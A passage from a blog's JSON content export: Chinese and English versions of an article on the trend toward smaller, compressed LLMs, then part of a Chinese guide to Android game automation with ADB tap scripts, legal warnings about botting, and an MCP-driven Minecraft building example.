CO2。能源消耗延伸到训练之外到推理，其中大规模服务大型模型需要大量的计算资源。小型模型通过在训练和部署方面需要指数级更少的功率来提供更可持续的前进道路。这与对环境负责任的 AI 开发日益增长的监管和社会压力保持一致。公司越来越多地采用小型模型，不仅是为了节省成本，而且作为更广泛的可持续性倡议的一部分，认识到 AI 的环境足迹必须最小化以确保长期可行性。 可及性和民主化 大型模型通常需要专门的硬件和基础设施，创造了一个重大的进入障碍，限制了对资金充足的研究机构和科技巨头的访问。像 GPT-4 这样的模型的计算需求需要数据中心规模的基础设施，很少有组织能够负担或维护。小型模型通过在消费级硬件、边缘设备甚至手机上运行来使先进的 AI 能力民主化。这一转变使各种规模的开发者、研究人员和企业能够利用语言模型，而无需禁止性的基础设施成本。例如，像 DistilBERT 这样的模型可以在智能手机上运行，为保护用户隐私和离线工作的设备上 AI 应用程序开辟了可能性。这种民主化正在推动来自不同来源的创新浪潮，因为更多的参与者可以实验和贡献 AI 开发。 模型压缩的技术进步 小型 LLM 最直接的驱动因素是压缩技术和架构创新的快速进步。这些技术突破使得创建小几个数量级的模型成为可能，同时保留其大部分能力。 🔢 量化技术量化将模型权重的精度从 32 位浮点数降低到较低精度格式，如 8 位或甚至 4 位整数。这可以将模型大小缩小高达 75%，同时最小化性能损失。像 GPTQ（GPT 量化）和 AWQ（激活感知权重量化）这样的先进量化方法优化量化过程以保持模型准确性。 🎓 知识蒸馏这种技术涉及训练较小的&quot;学生&quot;模型来复制较大的&quot;教师&quot;模型的行为。学生学习模仿教师的输出，有效地将知识压缩成更紧凑的形式。最近的进展已经将此扩展到多教师蒸馏和自我蒸馏方法。 ✂️ 修剪和稀疏性修剪从神经网络中移除不必要的连接和神经元，创建可以进一步压缩的稀疏模型。结构化修剪保持模型的架构，而非结构化修剪可以实现更高的压缩比。像基于幅度的修剪和动态修剪这样的技术变得越来越复杂。 ⚙️ 高效架构新的架构设计专门针对效率。像 MobileBERT 和 TinyLLaMA 这样的模型结合了高效的注意力机制、分组卷积和优化的层设计，减少计算复杂性同时保持表达能力。 💡 混合方法最有效的压缩通常结合多种技术。例如，模型可能经历知识蒸馏，然后进行量化和修剪，实现 10 倍或更多的压缩比，同时保留原始性能的 95%。 这些技术进步不仅仅是使小型模型成为可能——它们从根本上改变了我们对模型设计的思考方式，将焦点从最大化参数转移到优化效率和每个参数的性能。 好处：小型 LLM 的优势 朝向小型 LLM 的转变提供了超越单纯尺寸减少的众多优势。 改进的性能和速度 小型模型通常表现出更快的推理时间，使它们更适合实时应用程序。在需要快速响应的情境中，例如聊天机器人或交互系统，紧凑模型的减少延迟提供了显著的优势。这种性能改进对于具有严格时间要求的应用程序特别关键。 增强的部署灵活性 📱 部署机会小型 LLM 的紧凑性质使得能够在更广泛的设备和环境中部署。从云端服务器到边缘设备和移动应用程序，这些模型可以在较大模型不切实际或不可能的情境中运作。这种灵活性开启了新的使用案例，例如用于隐私敏感应用程序的设备上语言处理或在偏远地区的离线功能。 减少的资源需求 小型模型消耗更少的内存和计算能力，使它们成为资源受限环境的理想选择。这对于开发中地区或针对低端硬件的应用程序特别有价值。减少的资源足迹也转化为更低的运营成本和改进的可扩展性。 能源效率和可持续性 通过需要更少的计算能力，小型 LLM 有助于减少能源消耗。这不仅降低了运营成本，而且与可持续性目标保持一致。在 AI 的环境影响受到审查的时代，小型模型为语言处理提供了更负责任的方法。 改进的隐私和安全性 🔒 隐私优先部署小型模型的设备上部署通过将敏感数据保持在本地而不是发送到远程服务器来增强隐私。这对于涉及个人或机密信息的应用程序至关重要，减少了数据泄露的风险并确保符合隐私法规。 结论 朝向小型 LLM 的趋势代表了 AI 开发的关键转变，由对效率、可及性和可持续性的需求驱动。随着计算限制和环境问题继续塑造该领域，创建强大而紧凑的模型的能力变得越来越有价值。小型 LLM 的好处——从改进的性能和部署灵活性到增强的隐私和减少的环境影响——将它们定位为未来 AI 创新的基石。 这种演变呼应了 AI 开发中更广泛的主题，其中对效率和可及性的追求推动技术进步。随着研究继续推进压缩技术和架构创新，小型 LLM 准备使先进的语言处理能力民主化，使更广泛的应用程序成为可能，并促进更包容的 AI 开发。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"縮小的前沿：小型 LLM 如何革新 AI","slug":"2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI-zh-TW","date":"un00fin00","updated":"un66fin66","comments":true,"path":"/zh-TW/2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI/","permalink":"https://neo01.com/zh-TW/2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI/","excerpt":"從1750億參數到口袋大小模型——探索壓縮技術如何民主化AI、大幅降低成本並實現裝置上智能。","text":"在快速發展的人工智慧領域中，大型語言模型（LLM）經歷了顯著的轉變。從需要巨大計算資源的大規模模型開始，已經轉向效率和可及性的範式。本文探討了小型 LLM 的新興趨勢，分析了這一轉變背後的驅動因素以及它們提供的實質好處。從 AI 研究的最新進展中汲取靈感，我們揭示了這一趨勢如何重塑該領域並使強大的語言處理能力民主化。 趨勢：從大規模到微型 LLM 發展的軌跡一直以最初朝向更大、更複雜模型的軍備競賽為特徵。像 GPT-3 這樣的早期突破，擁有 1750 億個參數，展示了前所未有的語言理解能力，但代價高昂。然而，近年來見證了朝向模型壓縮和效率的反向運動。研究機構和科技公司越來越專注於創建更小、更精簡的模型，同時保留其較大對應物的大部分效能。 這一趨勢在蒸餾和壓縮模型的激增中顯而易見。像知識蒸餾這樣的技術，其中較小的「學生」模型從較大的「教師」模型學習，已經能夠創建小幾個數量級的模型。例如，DistilBERT，BERT 的蒸餾版本，在小 40% 和快 60% 的同時實現了原始模型 97% 的效能。同樣，TinyLLaMA 和其他較大模型的緊湊變體正在獲得關注，為資源受限的環境提供可行的替代方案。 驅動因素：模型壓縮背後的力量 朝向小型 LLM 的轉變是由技術、經濟、環境和社會因素的匯合推動的。這些驅動因素不是孤立的，而是形成了一個相互連接的生態系統，使模型壓縮既必要又可實現。理解這些力量提供了對為什麼 AI 社群越來越優先考慮效率而不是純粹規模的見解。 計算效率和成本降低 訓練和部署大型模型的計算需求呈現出已經變得越來越難以承受的重大障礙。訓練 GPT-3 需要估計 570,000 GPU 小時，花費數百萬美元，推理成本按比例擴展。隨著 AI 在各行各業變得更加普遍——從醫療保健到金融——這些資源需求創造了實質的經濟障礙。小型模型通過大幅降低訓練和推理成本來解決這個問題。例如，蒸餾模型可能只需要其全尺寸對應物 10-20% 的計算資源，同時保持 90-95% 的效能。這種成本降低使初創公司、學術研究人員和較小的組織能夠參與 AI 開發，促進整個生態系統的創新，而不是將其集中在少數資金充足的實體中。 能源效率和環境考量 AI 訓練的環境影響近年來已成為一個關鍵問題。大型模型對實質的碳足跡有貢獻，估計表明訓練單個大型語言模型可以排放與五輛汽車在其生命週期內一樣多的 CO2。能源消耗延伸到訓練之外到推理，其中大規模服務大型模型需要大量的計算資源。小型模型通過在訓練和部署方面需要指數級更少的功率來提供更可持續的前進道路。這與對環境負責任的 AI 開發日益增長的監管和社會壓力保持一致。公司越來越多地採用小型模型，不僅是為了節省成本，而且作為更廣泛的可持續性倡議的一部分，認識到 AI 的環境足跡必須最小化以確保長期可行性。 可及性和民主化 大型模型通常需要專門的硬體和基礎設施，創造了一個重大的進入障礙，限制了對資金充足的研究機構和科技巨頭的訪問。像 GPT-4 這樣的模型的計算需求需要數據中心規模的基礎設施，很少有組織能夠負擔或維護。小型模型通過在消費級硬體、邊緣裝置甚至手機上運行來使先進的 AI 能力民主化。這一轉變使各種規模的開發者、研究人員和企業能夠利用語言模型，而無需禁止性的基礎設施成本。例如，像 DistilBERT 這樣的模型可以在智慧型手機上運行，為保護使用者隱私和離線工作的裝置上 AI 應用程式開闢了可能性。這種民主化正在推動來自不同來源的創新浪潮，因為更多的參與者可以實驗和貢獻 AI 開發。 模型壓縮的技術進步 小型 LLM 最直接的驅動因素是壓縮技術和架構創新的快速進步。這些技術突破使得創建小幾個數量級的模型成為可能，同時保留其大部分能力。 🔢 量化技術量化將模型權重的精度從 32 位元浮點數降低到較低精度格式，如 8 位元或甚至 4 位元整數。這可以將模型大小縮小高達 75%，同時最小化效能損失。像 GPTQ（GPT 量化）和 AWQ（激活感知權重量化）這樣的先進量化方法優化量化過程以保持模型準確性。 🎓 知識蒸餾這種技術涉及訓練較小的「學生」模型來複製較大的「教師」模型的行為。學生學習模仿教師的輸出，有效地將知識壓縮成更緊湊的形式。最近的進展已經將此擴展到多教師蒸餾和自我蒸餾方法。 ✂️ 修剪和稀疏性修剪從神經網路中移除不必要的連接和神經元，創建可以進一步壓縮的稀疏模型。結構化修剪保持模型的架構，而非結構化修剪可以實現更高的壓縮比。像基於幅度的修剪和動態修剪這樣的技術變得越來越複雜。 ⚙️ 高效架構新的架構設計專門針對效率。像 MobileBERT 和 TinyLLaMA 這樣的模型結合了高效的注意力機制、分組卷積和優化的層設計，減少計算複雜性同時保持表達能力。 💡 混合方法最有效的壓縮通常結合多種技術。例如，模型可能經歷知識蒸餾，然後進行量化和修剪，實現 10 倍或更多的壓縮比，同時保留原始效能的 95%。 這些技術進步不僅僅是使小型模型成為可能——它們從根本上改變了我們對模型設計的思考方式，將焦點從最大化參數轉移到優化效率和每個參數的效能。 好處：小型 LLM 的優勢 朝向小型 LLM 的轉變提供了超越單純尺寸減少的眾多優勢。 改進的效能和速度 小型模型通常表現出更快的推理時間，使它們更適合即時應用程式。在需要快速回應的情境中，例如聊天機器人或互動系統，緊湊模型的減少延遲提供了顯著的優勢。這種效能改進對於具有嚴格時間要求的應用程式特別關鍵。 增強的部署靈活性 📱 部署機會小型 LLM 的緊湊性質使得能夠在更廣泛的裝置和環境中部署。從雲端伺服器到邊緣裝置和行動應用程式，這些模型可以在較大模型不切實際或不可能的情境中運作。這種靈活性開啟了新的使用案例，例如用於隱私敏感應用程式的裝置上語言處理或在偏遠地區的離線功能。 減少的資源需求 小型模型消耗更少的記憶體和計算能力，使它們成為資源受限環境的理想選擇。這對於開發中地區或針對低端硬體的應用程式特別有價值。減少的資源足跡也轉化為更低的營運成本和改進的可擴展性。 能源效率和可持續性 通過需要更少的計算能力，小型 LLM 有助於減少能源消耗。這不僅降低了營運成本，而且與可持續性目標保持一致。在 AI 的環境影響受到審查的時代，小型模型為語言處理提供了更負責任的方法。 改進的隱私和安全性 🔒 隱私優先部署小型模型的裝置上部署通過將敏感資料保持在本地而不是發送到遠端伺服器來增強隱私。這對於涉及個人或機密資訊的應用程式至關重要，減少了資料洩露的風險並確保符合隱私法規。 結論 朝向小型 LLM 的趨勢代表了 AI 開發的關鍵轉變，由對效率、可及性和可持續性的需求驅動。隨著計算限制和環境問題繼續塑造該領域，創建強大而緊湊的模型的能力變得越來越有價值。小型 LLM 的好處——從改進的效能和部署靈活性到增強的隱私和減少的環境影響——將它們定位為未來 AI 創新的基石。 這種演變呼應了 AI 開發中更廣泛的主題，其中對效率和可及性的追求推動技術進步。隨著研究繼續推進壓縮技術和架構創新，小型 LLM 準備使先進的語言處理能力民主化，使更廣泛的應用程式成為可能，並促進更包容的 AI 開發。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-TW"},{"title":"The Shrinking Frontier: How Smaller LLMs Are Revolutionizing AI","slug":"2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI","date":"un00fin00","updated":"un66fin66","comments":true,"path":"2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI/","permalink":"https://neo01.com/2025/06/The_Shrinking_Frontier_How_Smaller_LLMs_Are_Revolutionizing_AI/","excerpt":"From 175 billion parameters to pocket-sized models—discover how compression techniques are democratizing AI, slashing costs by 90%, and enabling on-device intelligence.","text":"In the rapidly evolving landscape of artificial intelligence, Large Language Models (LLMs) have undergone a remarkable transformation. What began with massive models requiring enormous computational resources has shifted toward a paradigm of efficiency and accessibility. This exploration examines the emerging trend of smaller LLMs, analyzing the drivers behind this shift and the substantial benefits they offer. Drawing from recent advancements in AI research, we uncover how this trend is reshaping the field and democratizing access to powerful language processing capabilities. The Trend: From Massive to Miniature The trajectory of LLM development has been characterized by an initial arms race toward larger and more complex models. Early breakthroughs like GPT-3, with its 175 billion parameters, demonstrated unprecedented language understanding capabilities but came at a steep cost. However, recent years have witnessed a counter-movement toward model compression and efficiency. Research institutions and tech companies are increasingly focusing on creating smaller, more streamlined models that retain much of the performance of their larger counterparts. This trend is evident in the proliferation of distilled and compressed models. Techniques like knowledge distillation, where a smaller “student” model learns from a larger “teacher” model, have enabled the creation of models that are orders of magnitude smaller. For instance, DistilBERT, a distilled version of BERT, achieves 97% of the original model’s performance while being 40% smaller and 60% faster. Similarly, TinyLLaMA and other compact variants of larger models are gaining traction, offering viable alternatives for resource-constrained environments. Drivers: The Forces Behind Model Compression The shift toward smaller LLMs is propelled by a confluence of technological, economic, environmental, and societal factors. These drivers are not isolated but form an interconnected ecosystem that makes model compression both necessary and achievable. Understanding these forces provides insight into why the AI community is increasingly prioritizing efficiency over sheer scale. Computational Efficiency and Cost Reduction The computational demands of training and deploying large models present significant barriers that have become increasingly untenable. Training GPT-3 required an estimated 570,000 GPU hours and cost millions of dollars, with inference costs scaling proportionally. As AI becomes more ubiquitous across industries—from healthcare to finance—these resource requirements create substantial economic hurdles. Smaller models address this by dramatically reducing both training and inference costs. For instance, a distilled model might require only 10-20% of the computational resources of its full-sized counterpart while maintaining 90-95% of the performance. This cost reduction enables startups, academic researchers, and smaller organizations to participate in AI development, fostering innovation across the ecosystem rather than concentrating it in a few well-funded entities. Energy Efficiency and Environmental Considerations The environmental impact of AI training has emerged as a critical concern in recent years. Large models contribute to substantial carbon footprints, with estimates suggesting that training a single large language model can emit as much CO2 as five cars over their lifetime. The energy consumption extends beyond training to inference, where serving large models at scale requires significant computational resources. Smaller models offer a more sustainable path forward by requiring exponentially less power for both training and deployment. This aligns with growing regulatory and societal pressures for environmentally responsible AI development. Companies are increasingly adopting smaller models not just for cost savings but as part of broader sustainability initiatives, recognizing that AI’s environmental footprint must be minimized to ensure long-term viability. Accessibility and Democratization Large models often require specialized hardware and infrastructure, creating a significant barrier to entry that limits access to well-funded research institutions and tech giants. The computational requirements of models like GPT-4 necessitate data center-scale infrastructure that few organizations can afford or maintain. Smaller models democratize access to advanced AI capabilities by running on consumer-grade hardware, edge devices, and even mobile phones. This shift enables developers, researchers, and businesses of all sizes to leverage language models without prohibitive infrastructure costs. For example, models like DistilBERT can run on smartphones, opening possibilities for on-device AI applications that preserve user privacy and work offline. This democratization is driving a wave of innovation from diverse sources, as more participants can experiment with and contribute to AI development. Technical Advancements in Model Compression The most immediate driver of smaller LLMs is the rapid advancement in compression techniques and architectural innovations. These technical breakthroughs are making it possible to create models that are orders of magnitude smaller while retaining much of their capabilities. 🔢 Quantization TechniquesQuantization reduces the precision of model weights from 32-bit floating-point to lower precision formats like 8-bit or even 4-bit integers. This can shrink model size by up to 75% with minimal performance loss. Advanced quantization methods like GPTQ (GPT Quantization) and AWQ (Activation-aware Weight Quantization) optimize the quantization process to preserve model accuracy. 🎓 Knowledge DistillationThis technique involves training a smaller &quot;student&quot; model to replicate the behavior of a larger &quot;teacher&quot; model. The student learns to mimic the teacher's outputs, effectively compressing the knowledge into a more compact form. Recent advancements have extended this to multi-teacher distillation and self-distillation approaches. ✂️ Pruning and SparsityPruning removes unnecessary connections and neurons from neural networks, creating sparse models that can be further compressed. Structured pruning maintains the model's architecture while unstructured pruning can achieve higher compression ratios. Techniques like magnitude-based pruning and dynamic pruning are becoming increasingly sophisticated. ⚙️ Efficient ArchitecturesNew architectural designs specifically target efficiency. Models like MobileBERT and TinyLLaMA incorporate efficient attention mechanisms, grouped convolutions, and optimized layer designs that reduce computational complexity while maintaining expressive power. 💡 Hybrid ApproachesThe most effective compression often combines multiple techniques. For example, a model might undergo knowledge distillation followed by quantization and pruning, achieving compression ratios of 10x or more while retaining 95% of the original performance. These technical advancements are not just enabling smaller models—they’re fundamentally changing how we think about model design, shifting the focus from maximizing parameters to optimizing efficiency and performance per parameter. Benefits: The Advantages of Smaller LLMs The shift toward smaller LLMs offers numerous advantages that extend beyond mere size reduction. Improved Performance and Speed Smaller models often exhibit faster inference times, making them more suitable for real-time applications. In scenarios requiring quick responses, such as chatbots or interactive systems, the reduced latency of compact models provides a significant advantage. This performance improvement is particularly crucial for applications with strict timing requirements. Enhanced Deployment Flexibility 📱 Deployment OpportunitiesThe compact nature of smaller LLMs enables deployment across a wider range of devices and environments. From cloud servers to edge devices and mobile applications, these models can operate in contexts where larger models would be impractical or impossible. This flexibility opens new use cases, such as on-device language processing for privacy-sensitive applications or offline functionality in remote areas. Reduced Resource Requirements Smaller models consume less memory and computational power, making them ideal for resource-constrained environments. This is particularly valuable in developing regions or for applications targeting low-end hardware. The reduced resource footprint also translates to lower operational costs and improved scalability. Energy Efficiency and Sustainability By requiring less computational power, smaller LLMs contribute to reduced energy consumption. This not only lowers operational costs but also aligns with sustainability goals. In an era where AI’s environmental impact is under scrutiny, smaller models offer a more responsible approach to language processing. Improved Privacy and Security 🔒 Privacy-First DeploymentOn-device deployment of smaller models enhances privacy by keeping sensitive data local rather than sending it to remote servers. This is crucial for applications involving personal or confidential information, reducing the risk of data breaches and ensuring compliance with privacy regulations. Conclusion The trend toward smaller LLMs represents a pivotal shift in AI development, driven by the need for efficiency, accessibility, and sustainability. As computational constraints and environmental concerns continue to shape the field, the ability to create powerful yet compact models becomes increasingly valuable. The benefits of smaller LLMs—ranging from improved performance and deployment flexibility to enhanced privacy and reduced environmental impact—position them as a cornerstone of future AI innovation. This evolution echoes broader themes in AI development, where the pursuit of efficiency and accessibility drives technological progress. As research continues to advance compression techniques and architectural innovations, smaller LLMs are poised to democratize access to advanced language processing capabilities, enabling a wider range of applications and fostering more inclusive AI development.","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}]},{"title":"游戏自动化终极指南（不会被封禁的那种）","slug":"2025/05/Unleash_the_Power_of_Play-Game_Automation-zh-CN","date":"un11fin11","updated":"un00fin00","comments":false,"path":"/zh-CN/2025/05/Unleash_the_Power_of_Play-Game_Automation/","permalink":"https://neo01.com/zh-CN/2025/05/Unleash_the_Power_of_Play-Game_Automation/","excerpt":"想让你的游戏角色在你睡觉时自动打怪？学习 Android 自动化技术和 MCP 驱动的 AI 游戏玩法——但首先，让我们谈谈如何合法使用。","text":"你的队友们计划周六进行一场史诗级的 我的世界 建筑活动。然后周五晚上：「抱歉，明天不能来了。」一个接一个，你的朋友们都放鸽子。现在你盯着那个巨大的城堡项目，意识到独自完成需要好几周。 如果你的角色可以在你上学时继续建造呢？或者更好的是——如果 AI 可以通过你的描述来帮你建造呢？欢迎来到游戏自动化的世界，在这里你的游戏梦想成为现实。但首先，让我们谈谈如何避免麻烦。 ⚖️ 法律现实检查（是的，我们从这里开始） 🚨 认真说：这可能会让你陷入麻烦在你自动化任何东西之前，请理解：大多数在线游戏在其服务条款中明确禁止使用机器人。被抓到意味着： 永久账号封禁（再见了，那个 99 级角色） IP 封禁（连新账号都无法创建） 法律后果（在某些国家，是的，真的） 机器人 = 坏消息的情况 在线多人游戏绝对不能使用自动化： MMORPG（魔兽世界、Final Fantasy XIV） 竞技游戏（英雄联盟、无畏契约、Mobile Legends） 有 PvP 的抽卡游戏（原神、崩坏：星穹铁道） 为什么？因为你对真实玩家获得了不公平的优势。游戏公司非常重视这一点——他们有整个团队在猎捕机器人。 各国特定法律 某些国家将游戏机器人视为： 诈骗（你违反了合约） 未经授权的计算机访问（在极端情况下） 虚拟财产盗窃（如果你在刷物品并出售） 例如，韩国已经起诉过机器人用户。为了一些虚拟黄金不值得冒这个险，对吧？ 自动化实际上可以的情况 ✅ 自动化的安全区域 单人游戏（你的游戏，你的规则） 允许模组的沙盒游戏（我的世界、Terraria） 有官方 API 支持的游戏（某些放置游戏） 学习用的个人项目（只是不要连接到在线服务器） 🤖 Android 游戏自动化：技术分析 Android 是自动化的游乐场。iOS？那就像试图在锁定的主机上改游戏——可以通过越狱实现，但麻烦得多。 方法 1：屏幕录制与回放 **运作方式：**录制你的点击和滑动，然后循环播放。 **工具：**Auto Clicker 应用程序、MacroDroid、ADB（Android Debug Bridge） 優點： 不需要编码（对於应用程序） 適用於任何遊戲 设定简单（真的只需 5 分钟） 可以用 ADB 編寫复杂的点击模式腳本 缺點： UI 稍有变化就會失效 无法適應遊戲事件 容易被反作弊系统侦测 看起來像机器人（每次时间都一樣） **最适合：**简单的放置遊戲、每日登入獎勵、節奏遊戲练习 實際范例：ADB 点击腳本 ⚖️ 执行此腳本之前**先检查遊戲的服务条款！**此范例僅供教育目的，應僅用於： 離線單人遊戲 明確允许自动化的遊戲 你自己的测试应用程序 在在线多人遊戲上使用可能導致永久封鎖，并可能違反你所在國家的法律。如有疑問，不要冒險。 这是一个 Windows 批次腳本，可以在你的 Android 屏幕上自动点击多个位置： for &#x2F;l %%x in (1, 1, 10000) do ( adb shell &quot;input tap 300 1400 &amp; input tap 400 1400 &amp; input tap 500 1400 &amp; input tap 600 1400 &amp; input tap 700 1400 &amp; input tap 550 1400 &amp; input tap 450 1400 &amp; input tap 350 1400 &amp; input tap 250 1400 &amp; input tap 475 1400 &amp; input tap 375 1400 &amp; input tap 525 1400 &amp; input tap 575 1400&quot; ) 此腳本按順序点击 13 个不同的屏幕位置，重复 10,000 次。非常适合有多个点击區域的離線遊戲（如節奏遊戲练习模式或允许自动化的放置点击遊戲）。 如何设定： 在 Android 上啟用开发者选项： 前往设定 → 關於手機 点击「版本號碼」7 次 你會看到「你现在是开发者了！」 啟用 USB 调试： 设定 → 开发者选项 开启「USB 调试」 在计算机上安装 ADB： **Windows：**下載 Platform Tools Mac/Linux：brew install android-platform-tools 或使用套件管理器 解壓縮到文档夹（例如 C:\\adb） 连接你的手機： 通过 USB 将手機连接到计算机 在手機上，允许 USB 调试提示 测试连接：adb devices（应该显示你的装置） 找到你的点击坐标： 设定 → 开发者选项 → 啟用「指標位置」 开启你的遊戲并記下你想点击的 X,Y 坐标 格式是 input tap X Y（例如 input tap 300 1400） 建立你的腳本： **Windows：**保存為 auto-tap.bat **Mac/Linux：**保存為 auto-tap.sh 并执行 chmod +x auto-tap.sh 执行它： 验证遊戲允许自动化（检查服务条款） 在手機上开启你的遊戲 在计算机上执行腳本 看魔法发生！ 自訂腳本： # 更改循环次數（10000 &#x3D; 重复次數） for &#x2F;l %%x in (1, 1, 10000) do ( # 在点击之間添加延迟（以毫秒為單位） adb shell &quot;input tap 300 1400 &amp;&amp; sleep 0.1 &amp;&amp; input tap 400 1400&quot; # 添加滑動手勢 adb shell &quot;input swipe 300 1400 300 800 100&quot; # 格式：swipe startX startY endX endY duration(ms) 💡 专业提示 **先测试：**使用小循环次數（如 10）來验证坐标 **添加延迟：**某些遊戲會将快速点击侦测為作弊 **屏幕保持开启：**在开发者选项中啟用「保持唤醒」 **无线 ADB：**通过 USB 连接後，执行 adb tcpip 5555 然後 adb connect &lt;phone-ip&gt;:5555 进行无线自动化 方法 2：影像辨識机器人 **運作方式：**机器人「看到」屏幕，識別按钮/敌人，并做出反應。 **工具：**基於 OpenCV 的腳本、AnkuluaX 優點： 比錄製更靈活 可以处理小的 UI 变化 可以根据屏幕上的内容做出决策 缺點： 需要设定和测试 资源密集（快速耗盡電池） 仍然可以被复杂的反作弊侦测到 不同遊戲需要不同的腳本 **最适合：**農场遊戲、自动战鬥 RPG 方法 3：无障碍服务自动化 **運作方式：**使用 Android 的无障碍功能來读取和与应用程序互动。 **工具：**Tasker、AutoInput、自訂腳本 優點： 可以读取實際的 UI 元素（不只是图像） 比影像辨識更可靠 较低的资源使用 缺點： 设定复杂 需要了解 Android UI 结构 某些遊戲會封鎖无障碍服务 潜在的安全风险（你授予了深度系统访问权限） **最适合：**具有一致 UI 的遊戲、非竞技自动化 方法 4：Root 装置自动化 **運作方式：**完全系统访问 = 完全控制遊戲。 **工具：**Xposed Framework、Magisk 模组、自訂腳本 優點： 可以自动化任何東西 可以绕过某些侦测方法 可以修改遊戲行为 缺點： 使保修失效 重大安全风险（一个坏应用程序 = 装置被入侵） 许多遊戲拒绝在 root 装置上执行 复杂且有风险的过程 iOS 等效（越狱）更难且更不稳定 **最适合：**仅限开发者和修补者（认真的，不适合一般用户） ⚠️ 为什么 iOS 更难iOS 自动化需要： 越狱（使保修失效、安全风险） 有限的工具可用性 频繁的 iOS 更新會破坏越狱 Apple 积极对抗自动化 如果你认真对待遊戲自动化，请坚持使用 Android。 🎮 酷炫部分：MCP 驱动的遊戲自动化 现在我们谈论的是未来。忘记点击按钮——如果你可以用自然语言控制遊戲呢？ 智能体 在深入 MCP 之前，让我们了解是什麼让這个「魔法」起作用：智能体。 傳統 AI：你問，它回答一次，完成。 **智能体：**你给一个目標，它找出步骤，执行它们，检查進度，并持續进行直到目標完成。就像有一个不需要微觀管理的 AI 員工。 智能体循环： flowchart TD A[\"🎯 目標：建造白宫\"] --> B[\"🤔 思考：下一步是什麼？\"] B --> C{\"✅ 目標完成了嗎？\"} C -->|\"否\"| D[\"📋 计划：放置基础方块以建立基础结构\"] C -->|\"是\"| Z[\"🎉 停止并报告\"] D --> E[\"⚡ 执行：place-block x100\"] E --> F[\"📊 更新上下文：基础已鋪設\"] F --> B style A fill:#e3f2fd style B fill:#fff3e0 style C fill:#fff9c4 style D fill:#f3e5f5 style E fill:#e8f5e9 style F fill:#e1f5fe style Z fill:#c8e6c9 關鍵概念： 思考 - LLM 推理：「我下一步应该做什麼？」（花钱） 检查 - LLM 推理：「我完成了嗎？」（花钱） 计划 - LLM 推理：「我将放置基础方块來建立基础」（花钱） 执行 - MCP 命令：放置方块（几乎免费） 更新上下文 - 记住完成了什麼（用於下一个循环） 重复 - 直到達成目標 這个循环自主運行。你设定一次目標，然後看著它工作。 什麼是 MCP？ 模型上下文协议（MCP）让 AI 助手与应用程序互动。可以把它想象成给智能体「双手」，通过结构化命令來控制遊戲。 我的世界 + MCP：AI 驱动的遊戲玩法 Minecraft MCP Server 项目让你通过 Claude Desktop 使用自然语言控制 我的世界。不需要编码——只需对话。 實際范例：建造白宫 起点： 幕后发生的事情： 你给一个提示：「建造這个」（附上白宫图片） 然後 Claude Desktop 完全接管，自动进行數百次 MCP 工具调用： 你的输入： 你：「建造這个」[附上白宫图片] Claude Desktop（智能体 循环 - 内部过程）： 👁️ 分析图像：「这是白宫」 --- 智能体 循环迭代 #1 --- 🧠 推理：「建造完成了嗎？否。计划：放置石英方块以建立基础」 ⚡ 执行 MCP：get-position、place-block x100 📊 上下文已更新：基础完成 --- 智能体 循环迭代 #2 --- 🧠 推理：「建造完成了嗎？否。计划：在基础上建造墙壁以形成结构」 ⚡ 执行 MCP：place-block x200 📊 上下文已更新：墙壁完成 --- 智能体 循环迭代 #3 --- 🧠 推理：「建造完成了嗎？否。计划：在墙壁上添加玻璃窗以增加真实性」 ⚡ 执行 MCP：place-block (glass_pane) x50 📊 上下文已更新：窗户完成 --- 智能体 循环迭代 #4 --- 🧠 推理：「建造完成了嗎？否。计划：用楼梯建造屋顶以匹配白宫风格」 ⚡ 执行 MCP：place-block (quartz_stairs) x150 📊 上下文已更新：屋顶完成 --- 智能体 循环迭代 #5 --- 🧠 推理：「建造完成了嗎？否。计划：添加装饰元素以增强真实感」 ⚡ 执行 MCP：place-block (decorations) x30 📊 上下文已更新：装饰完成 --- 智能体 循环迭代 #6 --- 🧠 推理：「建造完成了嗎？是！所有元素都存在。」 🛑 停止循环 - 未执行 MCP 命令 MCP 工具调用（在 UI 中折叠，但正在发生）： ▶ get-position 结果：&#123;x: 100, y: 64, z: -60&#125; ▶ place-block (quartz, foundation) ▶ place-block (quartz, foundation) ▶ place-block (quartz, foundation) ...（数百个方块） ▶ place-block (glass_pane, windows) ▶ place-block (glass_pane, windows) ...（更多窗户） ▶ place-block (quartz_stairs, roof) ...（屋顶建造） ▶ place-block (decorations) ...（最后修饰） Claude 的回应（你看到的）： 我可以看到这是白宫的图像。我将在 我的世界 中建造 一个简化版本。让我從建立基础和主要结构开始。 [自动建造] 我已經完成了白宫，包括： - 石英方块的主要结构 - 装饰柱 - 窗框和窗楣 - 屋顶上的多层圆顶 - 树木和花园的景观美化 **关键点：**你不需要手动說「添加窗户」或「加高」。Claude 的 agentic 循环自主地： 检查目標是否完成 决定下一步要建造什麼 执行 MCP 命令 更新其上下文 重复直到确定建造完成 自动停止（不再有 MCP 命令） 成本分解范例： 1 次视觉分析： $0.02 50 次 agentic 循环迭代： $2.00 ← 这是昂贵的部分！ - 每次迭代 &#x3D; 1 次推理（「下一步？」+「完成了嗎？」） - 50 次迭代 &#x3D; 50 次推理 &#x3D; $$$ 1000+ 次 MCP 命令执行： $0.00（本地 我的世界 服务器） ───────────────────────────────────── 总计： ~$2.02 用於复杂的白宫建造 注意：当推理确定「建造完成」時循环停止 最后的推理花钱但不执行 MCP 命令 最终结果： 💰 成本考量：是思考，不是命令成本来自哪里： 视觉 API：~$0.01-0.05（一次性分析图像） **智能体 循环迭代：**这是成本累积的地方！💸 每次迭代 = 1 次 LLM 推理 每次推理询问：「我完成了嗎？如果没有，下一步是什麼？」 复杂建造 = 许多迭代 范例：白宫可能需要 50-100 次迭代 每次迭代根据处理的 token 数量计费 最后迭代：确定「完成」但不执行 MCP 命令（仍然花钱） **MCP 